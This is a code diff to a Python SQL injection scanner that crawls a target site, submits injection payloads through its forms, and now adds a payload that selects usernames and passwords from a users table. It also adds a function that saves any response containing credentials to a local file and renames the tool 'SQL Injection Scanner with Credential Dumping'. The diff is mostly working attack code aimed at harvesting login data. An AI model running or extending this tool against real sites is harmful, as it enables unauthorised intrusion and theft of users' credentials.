@@ -21,6 +21,15 @@ formatter = colorlog.ColoredFormatter(LOG_FORMAT)
 handler.setFormatter(formatter)
 logger.addHandler(handler)
 
+# Change default color mapping to make everything yellow
+formatter._color_map = {
+    'DEBUG': 'yellow',
+    'INFO': 'yellow',
+    'WARNING': 'yellow',
+    'ERROR': 'yellow',
+    'CRITICAL': 'yellow'
+}
+
 # Global variables
 found_vulnerabilities = []
 lock = threading.Lock()
@@ -39,6 +48,7 @@ payloads += [
     "' OR 1=1 --",  # Common injection
     "'; SELECT table_name FROM information_schema.tables --",  # Tables enumeration
     "'; SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",  # Columns enumeration
+    "'; SELECT username, password FROM users --",  # Attempt to dump credentials (example)
 ]
 
 # Headers to make requests seem normal
@@ -84,11 +94,24 @@ def test_sql_injection(url, method, form_data):
                 with lock:
                     found_vulnerabilities.append((url, payload, "MySQL-based SQL Injection"))
                     logger.info(f"MySQL-based SQL Injection found at {url} with payload {payload}")
+            elif 'username' in response.text and 'password' in response.text:  # Potential credentials dump
+                logger.info(f"[CREDENTIALS DUMP] Found credentials at {url} with payload {payload}")
+                dump_credentials(response.text)
             else:
-                # Add the "else" case which will show up in yellow
-                logger.warning(f"[ ELSE ] Trying different payloads at {url} with payload {payload}")
+                logger.info(f"[ ELSE ] Trying different payloads at {url} with payload {payload}")
+
+            # Print success message if vulnerability is detected
+            if response.status_code == 200 and ('username' in response.text or 'password' in response.text):
+                logger.info(f"[SUCCESS] ACCESS GRANTED WITH PAYLOAD: {payload}")
+                
         except RequestException as e:
-            logger.error(f"Error testing {url}: {str(e)}")
+            logger.info(f"Error testing {url}: {str(e)}")
+
+# Function to save the credentials dump to a file
+def dump_credentials(data):
+    with open('dumped_credentials.txt', 'a') as f:
+        f.write(data + "\n")
+    logger.info("Credentials dumped to 'dumped_credentials.txt'")
 
 # Function to scan forms on a page
 def scan_forms(url):
@@ -114,9 +137,9 @@ def scan_forms(url):
             if form_data:
                 test_sql_injection(action_url, method, form_data)
             else:
-                logger.debug(f"No form inputs found on {url}.")
+                logger.info(f"No form inputs found on {url}.")
     except RequestException as e:
-        logger.error(f"Error while fetching {url}: {str(e)}")
+        logger.info(f"Error while fetching {url}: {str(e)}")
 
 # Function to crawl and explore the target URL (multiple pages)
 def crawl(url):
@@ -147,7 +170,7 @@ def crawl(url):
                     urls_to_scan.append(full_url)
 
         except RequestException as e:
-            logger.error(f"Error fetching links from {current_url}: {str(e)}")
+            logger.info(f"Error fetching links from {current_url}: {str(e)}")
 
 # Main function
 def main(target_url):
@@ -168,7 +191,7 @@ def main(target_url):
 
 if __name__ == '__main__':
     import argparse
-    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
+    parser = argparse.ArgumentParser(description="SQL Injection Scanner with Credential Dumping")
     parser.add_argument('-u', '--url', type=str, required=True, help="Target URL")
     args = parser.parse_args()
 
